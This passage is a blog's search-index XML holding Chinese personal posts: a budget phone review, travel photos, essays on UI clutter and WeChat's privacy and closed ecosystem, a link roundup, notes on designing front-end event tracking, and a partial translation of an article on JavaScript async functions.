<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>买了个多亲 AI 助手</title>
      <link href="/2019/09-09-qin2/"/>
      <url>/2019/09-09-qin2/</url>
      
        <content type="html"><![CDATA[<p>上个月在小米有品499众筹的，九月一日发货，中间等了有差不多半个月。但是在九月一日之前就出现了很多该手机的开箱视频，别问，问就是恰饭。</p><video src="/2019/09-09-qin2/open.mp4" controls="controls"></video><p>小屏幕的优点：屏占比高、握持感优秀、续航长。这手机内置了遥控器功能，但是貌似把系统自带的其他应用（具体哪一个或者哪几个我也不清楚）禁用了之后就回闪退。遥控空调还是挺让人眼前一亮，但是想想貌似又没什么用。没有前置摄像头，作为备用机，我也完全不需要前置摄像头（吐槽一下招行app，我 s10+ 居然调用后置摄像头来人脸识别，而且用了镜子也识别不上）。后置摄像头只有五百万像素，唯一的功能就是扫码。这手机握持感不如 5c，但是肯定有 se 强，毕竟那么窄。</p><p>小屏幕的缺点嘛，就是屏幕太小了，装了个斗鱼看直播，流畅和蓝光没区别。横屏观看，可视面积就只有火柴盒大小，可能和竖屏观看的大小差不多……手机的installer是被魔改过的，只能装六个第三方应用，貌似是为了让家长放心的买个学子们使用。然而安卓毕竟是安卓，冰箱+安装狮绕过原生的installer进行安装就行了。还有个缺点就是屏幕亮度不怎么受控制，0% 和 50% 一样亮，屏幕素质差，真的差。除开分辨率和贴合厚度讲的差，对比度太低了，跟看风化照片似的。</p><p>这手机折腾的时间还是挺长的，主要来自于接近于原生的 android go 和 22：9 的屏幕。</p><p>综上，499作为备用机堪用，折腾也能玩儿一阵。但是安卓就是安卓，what do you expect?</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>南京</title>
      <link href="/2019/03-12-photos/"/>
      <url>/2019/03-12-photos/</url>
      
        <content type="html"><![CDATA[<p>上周末趁着双休和紧邻的两个夜晚，和女友一起去了南京。</p><p>这里的人们给我一种爱活的印象，街上的每个人都很自在。</p><p>不大的主城区里新老建筑融合在一起，这种变化时常让我没有准备，就像是城墙后面是大厦组成的天际线，或者是位置意想不到的先锋书店，给人一种赛博朋克的恍惚感觉。</p><p><img src="./0.JPG" alt=""></p><p><img src="./1.JPG" alt=""></p><p><img src="./2.JPG" alt=""></p><p><img src="./3.JPG" alt=""></p><p><img src="./4.JPG" alt=""></p><p><img src="./5.JPG" alt=""></p><p><img src="./6.JPG" alt=""></p><p><img src="./7.JPG" alt=""></p><p><img src="./8.JPG" alt=""></p><p><img src="./9.JPG" alt=""></p><p><img src="./a.JPG" alt=""></p><p><img src="./b.JPG" alt=""></p><p><img src="./c.JPG" alt=""></p><p>很长一段时间不写东西了，原因是这段时间很多想法一闪而过没有用心去捕捉，再者正如上次说到过的，我怕和其他人一样定位在主流的对立面，不敢再输出价值观了。所以从那时候开始，博客更多的还是记录思维和生活。</p><p>想到再写，peace。</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Bad HUD Rapes</title>
      <link href="/2018/08-25-fixedRaping/"/>
      <url>/2018/08-25-fixedRaping/</url>
      
        <content type="html"><![CDATA[<h1 id="HUD"><a href="#HUD" class="headerlink" title="HUD"></a>HUD</h1><p>平视显示器 HUD (head-up display) 是一种飞行辅助仪器，安装在驾驶员前方，这样驾驶员不用低头看各种仪表，能在平视时看见各种关键信息。</p><p><img src="/2018/08-25-fixedRaping/Hud_on_the_cat.jpg" alt="HUD"></p><p>后来 HUD 出现在汽车驾驶辅助和游戏中，用于驾驶者和玩家悉知各种关键信息。</p><p><img src="/2018/08-25-fixedRaping/Supertuxkart-0.8.1-screenshot-6.png" alt="HUD"></p><p>但是和飞机汽车驾驶员拥有全视角不同，游戏对玩家的反馈绝大部分都是通过显示器完成的。除了面前的显示器和游戏声音之外，基本就没什么渠道可以获取游戏信息了，可能这也是 NDS 副屏和可震动游戏手柄让人喜欢的原因之一吧。</p><p><img src="/2018/08-25-fixedRaping/582px-Nintendo-DSi-Bl-Open.png" alt="NDS"></p><h1 id="减少元素"><a href="#减少元素" class="headerlink" title="减少元素"></a>减少元素</h1><p>游戏设计者会谨慎的筛选常驻于 HUD 的信息：对于 FPS 游戏来说，玩家的血量、剩余子弹数量、小地图、游戏进程等；对于 RPG 来说，HUD 一般会展示玩家的血量、魔法值、技能等等。过多的常驻内容会影响玩家的体验，在很多大型游戏中都能看到关闭 HUD 的选项，使玩家拥有沉浸式的体验。</p><p>而对于非第一要素的内容，例如游戏敌人的血量，通常会放在敌人形象的上方；菜单栏一般会通过点击 esc 来打开；对于某些游戏，HUD 的使用会更少：例如一辆会撞坏的汽车，它的血量不会显示在 HUD 中，而是通过引擎盖冒烟、着火来显示；例如受伤的角色会有伤口，流血。</p><p>为什么不把 NPC 的魔法值或者是他的技能常驻在窗口内呢？</p><h1 id="SNR"><a href="#SNR" class="headerlink" title="SNR"></a>SNR</h1><p>展示垃圾 HUD 和智能音箱投放阈下知觉广告这一行为类似，可能在听觉上这一行为更加可耻，毕竟我们可以不看某些内容，但是很难做到不听某些内容。</p><p>移动端网页中的 <code>position: fixed</code> 的内容是新一代的 HUD。在可视范围越来越小的时候，我们选取放在 HUD 里的内容时也应越发谨慎才对。</p><p>为了展示优先级高的内容，我们可以花点时间考虑一下什么内容能够常驻展示，真的。例如当大多数人都知道网页内从左向右滑动是返回上一级页面的话，那就用不着在有了导航栏之后，还专门为前进/返回按钮单独开辟一个 tab 了。是的，我说的就是微信。不知道在 iPhone4 上使用微信自带浏览器还能不能看见网页内容。</p><p><img src="/2018/08-25-fixedRaping/20180825223327.png" alt=""></p><p>上面这张图有些不妥，左图的垃圾用户体验是微信和百度合力造成的。双导航栏、双菜单 icon、双返回 icon、两个 tab 栏，真是绝了。</p><p>微信自带浏览器和地方电视台拙劣的常驻广告都强奸了使用者的双眼，说不定还强奸了脑子。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>貌似批评微信已经成为我的日常，但是依然离不开啊，可能只能靠那天转发敏感内容来永久封禁了。<br>还有最后这张图是真的，绝了。<br>想到再写，祝好~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Let It Be</title>
      <link href="/2018/04-15-711/"/>
      <url>/2018/04-15-711/</url>
      
        <content type="html"><![CDATA[<iframe width="560" height="315" src="https://www.youtube.com/embed/GOF9E2WirfE?rel=0&amp;showinfo=0&amp;start=6" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe><p>前两天在推荐下，看了<a href="https://search.bilibili.com/all?keyword=%E8%B7%9F%E4%BD%A0%E5%8E%BB%E4%BD%A0%E5%AE%B6%E5%8F%AF%E4%BB%A5%E5%90%97" target="_blank" rel="noopener">搬运版本的东京电视台节目《跟着去你家可以吗》</a>。每集都会在晚上随机询问路人，能否用帮忙付打车费/酒费的条件，换取去他家里访问的机会。每集节目都是个短短的纪录片，类似《72小时纪实》，讲的就是每个人真实又平凡的生活日常。</p><p>我很喜欢这种（伪）纪实平凡的作品，不自觉地连着看了三集《去你家》，仿佛找到了《活着》、《步履不停》、《深夜食堂》、《小森林》的温暖感觉。每每看完都给我生活的勇气。</p><p>至今脑海中仍有着清晰记忆：高中时候，由于不想做作业于是提早去学校抄别人的，天还没亮就出门。巷子不长，左右穿插的路灯，路灯后面老式小区。我当时就看着顶楼的某扇窗，想象那一户的生活又是怎样的。世上有太多不同的人，活了太多种不同的人生。</p><p>下班乘地铁，电梯上表情严肃的陌路人，回家后都是脆弱又坚强，绝望又不甘心的个体吧？</p><hr><p>这种走到普通人身边观察的作品，一不小心就会变得做作和无病呻吟：观察不够全面，只是走到别人身边去，而去干些别人看不懂的事情；或是部分诚实，把事实筛选后展示给观众。带有观察者强烈的主观意见，这就让人很反感了。我并不期待在看完作品后能理解、能包容，但现如今就连「看完后不要加深偏见」都很难做到。产出者知道作品有影响力，却不知道自己的作品在道德上应不应当影响观者。</p><p>今早看到微博上<a href="https://weibo.com/1710406277/Gc22iCGre?type=comment" target="_blank" rel="noopener">滴滴文嵩在解释滴滴派单问题</a>，一些评论尝试用个例和偏见来证伪，他也一一回复，看得我很是揪心。先不论哪个算法更厉害，他尝试给这群人说理这件事就错了，尤其是微博上不懂程序的围棋爱好者们，以及对滴滴收费不满意的车主和用户。</p><p>有一群别有用心的作者，和一群不讲道理的观者，我实在是对国产作品提不起兴趣。</p><p>就看了三集「去你家」，每一集到了最后，背景乐都是披头士的《let it be》，最后放一个翻唱的《Yesterday》:</p><iframe width="560" height="315" src="https://www.youtube.com/embed/h9Bvw1hDAuo?rel=0&amp;controls=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe><p>并祝各位读者好～</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>主动与反抗</title>
      <link href="/2017/11-30-171130/"/>
      <url>/2017/11-30-171130/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我觉得写东西或者看东西，有趣的地方不是你的道理有多惊艳，多深刻，多标新立异。是你对于某件事情，能看到别人看不到的角度。原来这件事情还能这样看待，原来还能有这样的解法，啊，原来你会这样想。我觉得这个是写东西和阅读有意思的地方。但现在普遍都是陈词滥调，不是道理陈旧，是思维陈旧。还不停表达，跟我妈念经一样。</p></blockquote><p>以上摘选自 <a href="http://music.163.com/#/program?id=1366476523" target="_blank" rel="noopener">第四期 The Jungle</a> 听众反馈。</p><hr><p>我发现身边的不少人都容易陷入一种「就是要和你对着干」的思维当中，他们可以在第一时间直觉地想到非主流的另类观点。很多自媒体的写手都具有这种能力：当某件事被爆出来，他们可以嗅到舆论的走向并反其道而行之，发表一篇怼所有人的文章，然后游走在风口浪尖。当他们刻意发表自己对事件的看法的时候，就可以轻易的让其他人惊讶「原来还有这种角度」。这种反抗是刻意的与主流做对，但是大众观感良好。我不太喜欢这种行为，因为他们高估了自己为少数派，高估了这种能力的稀有性，并且刻意滥用以达到哗众取宠的效果。</p><p>当一个非主流的观点在脑中产生的时候，他们很难区分主动与不服从的区别、很难说这是不是直觉。输入到输出的间隔实在是太短了，根本没有回顾的时间：是输入参杂了主流的观点导致我这样想，还是我天生就这样。我们怎样区分做作和天才？</p><p>无论是主动还是反抗，谦逊告诉我们需要保持自己的独立，并尊重他人的观点。在现在这个价值观的后稀缺时代，我看到很多人都太想表达自己的见解了，他们宁愿相信自己是天生的小众，把自己定位在主流的对立面，却输出着主流的观点。这不是小众，真正的小众在洪流之中能够坚持独立的思考。</p><hr><p>这篇文章在某种意义上来说是一个自嘲。再也不敢说自己在输出了，我只是记录思维，在记录生活而已。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linxes Ⅰ</title>
      <link href="/2017/11-05-linxes/"/>
      <url>/2017/11-05-linxes/</url>
      
        <content type="html"><![CDATA[<p>这是一篇实验性的文章，想看的人看，不想看的就别看。</p><p>本类型的文章将会模仿 <a href="https://en.wikipedia.org/wiki/Newsletter" target="_blank" rel="noopener">newsletter</a>，以简介的加链接方式分享一些浪漫的东西。更新时间暂定为一周。</p><hr><h2 id="📺-说唱押韵的历史"><a href="#📺-说唱押韵的历史" class="headerlink" title="📺 说唱押韵的历史"></a>📺 说唱押韵的历史</h2><p><a href="https://www.youtube.com/channel/UCLXo7UDZvByw2ixzpQCufnA" target="_blank" rel="noopener">Vox</a>的视频。从介绍 Beats 和 Bar 开始，分析了一系列特色的押韵方式：<br>AABB 的结尾单押、单句里的内部押韵、Bar 切分单词、各种类型的多韵脚，还讲到了 Kendrick 和 命运交响曲的共同点。补充一些关于 Rap 的知识，至少作为茶座上的谈资。</p><p><a href="https://www.youtube.com/watch?v=QWveXdj6oZU" target="_blank" rel="noopener">Rapping, deconstructed: The best rhymers of all time</a></p><hr><h2 id="📺-优化视频的五个建议"><a href="#📺-优化视频的五个建议" class="headerlink" title="📺 优化视频的五个建议"></a>📺 优化视频的五个建议</h2><p>两个年轻人关于视频优化的建议。<a href="https://www.youtube.com/channel/UCABwqCK6XMowQDwlIz00UFw" target="_blank" rel="noopener">Brandon Havard</a> 作为一个科技视频主播，风格和我喜欢的 <a href="https://www.youtube.com/channel/UCBJycsmduvYEL83R_U4JriQ" target="_blank" rel="noopener">Marques Brownlee AKA. MKBHD</a> 很相似。个人喜好来讲，前者<a href="https://www.youtube.com/watch?v=h1Gx1x9sMdM" target="_blank" rel="noopener">近期</a>的视频风格更有超过<a href="https://www.youtube.com/watch?v=ld5H2L4j6LE" target="_blank" rel="noopener">后者</a>的趋势。注意，这里讲的是视频风格。</p><p><a href="https://www.youtube.com/watch?v=AIMEmc_SCPM" target="_blank" rel="noopener">Make Your Videos Better</a></p><hr><h2 id="📃-Google-硬件正在复兴包豪斯设计"><a href="#📃-Google-硬件正在复兴包豪斯设计" class="headerlink" title="📃 Google 硬件正在复兴包豪斯设计"></a>📃 Google 硬件正在复兴包豪斯设计</h2><p>从一代 Google Pixel 和 Daydream View VR Headsets 开始，谷歌的硬件正在复兴包豪斯设计（<a href="https://en.wikipedia.org/wiki/Bauhaus" target="_blank" rel="noopener">包豪斯是源自德国</a>）。文章由今天的谷歌硬件产品追溯到了四十年前意大利工业产品，发现了二者间的奇妙的关联。对其中 UX 的部分不感兴趣也没关系，至少图片看起来很美。</p><p><a href="https://blog.prototypr.io/google-and-the-resurgence-of-italian-design-e9234cf3d073" target="_blank" rel="noopener">Google and the Resurgence of Italian Design</a></p><hr><h2 id="📕-关于函数式思想"><a href="#📕-关于函数式思想" class="headerlink" title="📕 关于函数式思想"></a>📕 关于函数式思想</h2><p>一本小书，第一眼还以为是儿童书籍，用问答的方式由浅入深的介绍了函数式编程思想。深入浅出，阅读过程中频频引人深思。引用一个书评：</p><blockquote><p>上学最宝贵的收获之一是结交学识过人的朋友。自己闷头学得山穷水尽时，高手轻轻一句点拨，眼前便峰回路转，柳暗花明。每次上完课，有幸和朋友小聚，请教弱智问题，听朋友妙语解惑，实在是难得的人生乐事。</p></blockquote><p>（豆瓣）<a href="https://book.douban.com/subject/27080946/" target="_blank" rel="noopener">The Little Schemer</a></p><hr><h2 id="📺-鸡汤"><a href="#📺-鸡汤" class="headerlink" title="📺 鸡汤"></a>📺 鸡汤</h2><p>可能大家都看过 <a href="https://www.youtube.com/user/caseyneistat/videos" target="_blank" rel="noopener">Casey Neistat</a> 的<a href="https://www.youtube.com/watch?v=84WIaK3bl_s" target="_blank" rel="noopener">两万刀航班</a>视频。这个励志的也是来自他。</p><p><a href="https://www.youtube.com/watch?v=jG7dSXcfVqE" target="_blank" rel="noopener">DO WHAT YOU CAN’T</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>尽量不用微信吧</title>
      <link href="/2017/10-12-anti-wechat/"/>
      <url>/2017/10-12-anti-wechat/</url>
      
        <content type="html"><![CDATA[<p>本文带有作者价值观输出，请谨慎阅读。</p><h2 id="一是使用者完全没有隐私可言"><a href="#一是使用者完全没有隐私可言" class="headerlink" title="一是使用者完全没有隐私可言"></a>一是使用者完全没有隐私可言</h2><p>可能谈到微信是否隐私，大家最先想到的是个人聊天记录是否会被身边的人看到。这里所提到的并不是由使用者主动保护获得的隐私、或者是由操作系统保护获得的隐私，这些都和微信无关。</p><p>我想谈的是，作为一款大型的即时聊天软件，从保护用户的意志出发，所作出的努力。令人悲伤的是，我完全感受不到微信为我提供了什么保护措施能让我自由的与他人进行私密的在线交流。</p><p><a href="https://blog.yitianshijie.net/2017/07/19/im-apps-security-check-v1point2/" target="_blank" rel="noopener">微信没有端到端加密的选项</a>，iMessage 有、Wire 有、WhatsApp 有、Telegram 有、Line 有、Messenger 也有。</p><p>如果有一个恶意的微信工程师想查看你的聊天内容，他是完全有能力这样做的，而你对此一无所知。这也为网络审查提供了方便。</p><h2 id="Nothing-is-binary"><a href="#Nothing-is-binary" class="headerlink" title="Nothing is binary"></a>Nothing is binary</h2><p>我认为网络审查是有必要的，在任何一个有用户产出的地方都需要有网络审查和舆论引导。其中十分重要的是在给予<strong>用户自由发声的权利</strong>和<strong>在事情恶化之前控制住</strong>之间需要精确拿捏，这是对审查者的考验。</p><p>在如今舆论导向无处不在的大环境下，我们有必要学会做价值观的游击队员。不仅要辨别、躲避，更要吸取经验、挪为己用。我更想得到的是自己对于事件的观点，而不是任何人的结论或者看法。如果把获得经验作为最终目的的话，我认为自己总结事件很有帮助，而从别人的转述、报告、新闻稿中得到的经验就含杂了别人的观点。在事件中，他人的观点是真相的噪声。显然，苹果日报和南方周末的噪声都不小。</p><p>不顽固的用户会被他人有意识或无意识的价值观引导，无意识输出价值观的还好，可惜的是很多价值观输出都带有明显的利己意图，吃相难看。这也筛选出了更容易受引导的人成为忠实用户。那么容易受到引导的又是哪些人呢？</p><p>但是微信却不愿意给所有价值观输出者平等输出的机会，也不给所有接收者一个平等接收的机会，这相当的暴力。我不能在微信公众号文章内自由的添加外链，外链的形式是由微信自己定义的，文章内只能打开腾讯系的外链。我不能在文章里自由的添加音乐内容，我只能在它指定的曲库（QQ 音乐）中进行选择。我不能在文章中自由添加视频内容，只能在它指定的视频网站（腾讯视频）中指定。我不能通过系统级的通用链接跳转到它指定以外的其他应用。当然还有小程序，让微信变成了某种意义上的操作系统。要记住，互联网精神是开放和去中心化，是这些促使互联网成为了互联网。</p><p>在这个软件里变成了：我不能说我想说的，我也不能看我不想看的（此处断章取义）。</p><h2 id="🃏"><a href="#🃏" class="headerlink" title="🃏"></a>🃏</h2><p>我想不能离开微信的唯一原因就是大家都在用它。可能大家都隐约感受到这个软件的恶意，却又因为同样的原因不能离开：我的朋友、我的亲人、我的同事都离不开它。再看看<a href="http://weixin.qq.com/" target="_blank" rel="noopener">微信官网</a>自己的介绍：</p><blockquote><p>微信，是一个生活方式<br>超过九亿人使用的手机应用</p></blockquote><p>的确是在嘲讽我们这群这些离不开的用户了。</p><p>就在狗仔横行的时候我们觉得明星真是惨，一点隐私都没有，但是少有人能想到我们自己也没有隐私可言。</p><hr><p>本篇结尾就再来一遍：</p><p>想看的人看，不想看的就别看。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关于数据埋点</title>
      <link href="/2017/08-29-event-tracking/"/>
      <url>/2017/08-29-event-tracking/</url>
      
        <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>项目中需要埋点的地方越来越多，急需一套通用的埋点解决方案。之前基于后端 + api 的 PV／UV 统计方式不够精细、操作复杂，对于前端会入侵逻辑，后端在接收信息和事后统计时也不好处理逻辑。</p><p>结合<a href="https://help.growingio.com/Features/overview.html" target="_blank" rel="noopener">GrowingIO的展示信息</a>大概想了一下，需要采集的信息不过就是：</p><ol><li>打开的链接与打开的时间</li><li>用户个人信息（这个基本上都需要后端来做）</li><li>（需要统计的）元素展示时间与时长</li><li>（需要统计的）元素点击时间</li><li>关闭或跳转时间（和目标）</li></ol><p>需求自然而然就出来了：</p><ol><li>高效埋点</li><li>数据格式化，便于处理</li><li>精细埋点</li><li>兼容各种框架</li></ol><h2 id="所以选用什么方式呢"><a href="#所以选用什么方式呢" class="headerlink" title="所以选用什么方式呢"></a>所以选用什么方式呢</h2><p><a href="https://zhuanlan.zhihu.com/p/27659302" target="_blank" rel="noopener">百度外卖前端有篇</a>写得犹抱琵琶半遮面的文章就讲了一下他们的方案。写的挺详细的，就是没有开源。</p><p>里面讲了当今常用的几种埋点方式：</p><ol><li>命令式，大概就是我们这边的原始埋点方式</li><li>声明式，就是在 DOM 上声明需要采集的元素数据以及相关操作</li></ol><p>然后埋点行为就三个：</p><ol><li>ready 绑定就算</li><li>click 点击就算</li><li>show 统计时长</li></ol><p>声明式在现在动态操作 DOM 较多的现代框架中好像还不怎么好做，什么时候绑定呢，什么时候解绑呢，会不会重复绑定呢，展示时长怎么做呢？</p><p>首先想到的思路是监听、劫持全局的点击事件和滚动事件，然后如果检测到相关元素就绑定+采集，关闭或跳转前统一上传。然后上面的链接里面提供了一个更优雅的方式，<code>MutationObserver</code> + pollyfill，把用在自定义指令上的绑定更新解绑都放在普通元素上来了。所以可以结合两者，只用 <code>new</code> 一次就完成了埋点。</p><p>上面文章里写的方式直接结合了 vue 的自定义指令，绑定、更新、解绑一个不落，我想要的是在一个 json 里面声明需要采集的元素选择器名、至多到什么 <code>before</code>、<code>after</code>、<code>once</code>、<code>creatCounter</code>、<code>creatTimer</code> 就完了，大概这样：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">new EventTrack([</span><br><span class="line">    &#123;</span><br><span class="line">        node: '.buyButton',</span><br><span class="line">        before: beforeClick('click'),</span><br><span class="line">        after: afterClick('click')</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        node: '#banner7',</span><br><span class="line">        once: OnceShow('show'),</span><br><span class="line">        creatCounter,</span><br><span class="line">        creatTimer</span><br><span class="line">    &#125;</span><br><span class="line">], '/api/eventUpload')</span><br></pre></td></tr></table></figure></p><p>支持自定义函数（<code>beforeClick</code> 和 <code>afterClick</code>），以及多次绑定。</p><p>后端应该就是一个通用接口加一个通用数据库用户存放所有操作日志。希望这么些东西是有用的。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/Qquanwei/trackpoint-tools" target="_blank" rel="noopener">trackpoint-tools</a>，针对组建化的 react 写的函数式埋点方案，我这个弱鸡看得很费劲，但是很有参考价值。</p><p><a href="https://github.com/lodash/lodash" target="_blank" rel="noopener">lodash</a>，什么 <code>before</code>、<code>after</code>、<code>once</code> 都是 lodash 里面来的，lodash 注释写的是真的好啊。</p><p><a href="https://github.com/vissense/vissense" target="_blank" rel="noopener">VisSense</a>，一个可视元素触发事件的库，展示时长就靠它了。</p><hr><p>以下内容更新于一天后（8-30）</p><h2 id="遇见的坑"><a href="#遇见的坑" class="headerlink" title="遇见的坑"></a>遇见的坑</h2><p>我还是代码的阅读量太少了，基本上是不知道别人怎么进行埋点的，在写这个东西的时候就一直在问自己是不是别人写的时候都会直接在 DOM 上进行声明式埋点。虽然东西是差不多写出来了，但是需求却一直在变化，这在某一个方面上也说明了设计之初的不合理和不宽容。</p><p>阅读量不够的另一个体现在于代码不够优雅，比如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emailClients</span>(<span class="params">clients</span>) </span>&#123;</span><br><span class="line">    clients.forEach(<span class="function"><span class="params">client</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> clientRecord = database.lookup(client)</span><br><span class="line">        <span class="keyword">if</span> (clientRecord.isActive()) &#123;</span><br><span class="line">            email(client)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这种遍历数组的比较，其实可以变成：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">emailClients</span>(clients) &#123;</span><br><span class="line">    clients</span><br><span class="line">        .filter(<span class="keyword">is</span>ActiveClient)</span><br><span class="line">        .forEach(email)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title">isActiveClient</span>(client) &#123;</span><br><span class="line">    const clientRecord = database.lookup(client)</span><br><span class="line">    <span class="keyword">return</span> <span class="type">clientRecord.isActive()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比如默认变量的使用：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMicrobrewery</span><span class="params">(name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> breweryName = name || <span class="string">'default name'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>变成：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMicrobrewery</span><span class="params">(breweryName = <span class="string">'default name'</span>)</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>看着都令人赏心悦目。</p><p>具体又一个逻辑的问题没有考虑清楚：解绑的时候如何入侵呢？ MutationObserver 是相当好用的，能够相对异步的提供事件勾子，但是如果一个元素已经在 DOM 树中被删除了，那么监听事件的解绑又如何谈起呢？再进一步问，如果一个元素在 DOM 树中被删除了，如果再一次被添加进去，那之前绑定的监听事件还存在么？是不是要采用提前劫持事件的方式？</p><p>设计上还有很多不足的地方，比如自定义函数的传入方式、比如有没有必要将统一上传的功能集成在一起，如果不集成在一起，那么 log 是不是又要换一种方式返回出来，返回的格式又能不能自定义呢？</p><p>另外，有没有 document.querySelector() 的逆函数呢？传入一个 DOMObject，返回它的选择器字符串？</p><h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>上面提到的 document.querySelector() 的逆函数：<a href="https://github.com/ericclemmons/unique-selector" target="_blank" rel="noopener">unique-selector</a>。</p><p>如果只想监听出现和消失事件，可以用 <a href="https://github.com/jeremenichelli/hunt" target="_blank" rel="noopener">huntjs</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「翻译」使用 ES2017 Async 函数</title>
      <link href="/2017/08-17-Using-ES2017-Async-Functions/"/>
      <url>/2017/08-17-Using-ES2017-Async-Functions/</url>
      
        <content type="html"><![CDATA[<p>翻译自<a href="https://css-tricks.com/using-es2017-async-functions/" target="_blank" rel="noopener">Using ES2017 Async Functions</a></p><p><a href="https://github.com/tc39/proposals/blob/master/finished-proposals.md" target="_blank" rel="noopener">ES2017 在六月最终敲定了</a>，随之而来的是对我最喜欢的 <code>async</code> 函数的广泛支持。如果你也曾为异步 Javascript 而头疼，那么这就是解药。如果你没有的话，额，你有可能是个天才。</p><p>使用 <code>async</code> 让你或多或少以顺序的方式编写 JS 代码，而不用把逻辑放在回调、生成器、promises 里。</p><p>考虑有如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = fetch(<span class="string">'http://sampleapi.com/posts'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger()</span><br></pre></td></tr></table></figure><p>如果你写过 JS 的话，你应该知道上面的代码为啥不会如愿运行。</p><p>但是下面的代码会如愿运行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> fetch(<span class="string">'http:sampleapi.com/posts'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger()</span><br></pre></td></tr></table></figure><p>只用添加两个关键词，代码简洁直观，也能正常运行。</p><h1 id="在-ES6-之前的异步-JS"><a href="#在-ES6-之前的异步-JS" class="headerlink" title="在 ES6 之前的异步 JS"></a>在 ES6 之前的异步 JS</h1><p>在讲 <code>asybc</code> 和 <code>await</code> 之前，有必要先了解一下 promises。要弄懂 promises，还要再往前讲讲老式的回调。</p><p>ES6 里添加了 Promises，这让我们编写异步的 JS 有了飞跃。不再有所谓的 “回调地狱”。</p><p>我们可以为一个主函数传入一个可以在任意时候作为返回值调用的回调函数。这也是 JS 的基础。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readFile</span>(<span class="params"><span class="string">'file.txt'</span>, (data</span>) =&gt; </span>&#123;</span><br><span class="line">  <span class="comment">// 在回调内</span></span><br><span class="line">  <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的函数会从一个文件记录数据，这也只能在文件完全被读完之后进行。看起来很简单，但是如果你想按顺序读取并记录五个不同的文件怎么办呢？</p><p>在 Promises 出现之前，为了执行顺序你需要嵌套回调，如下：</p><figure class="highlight 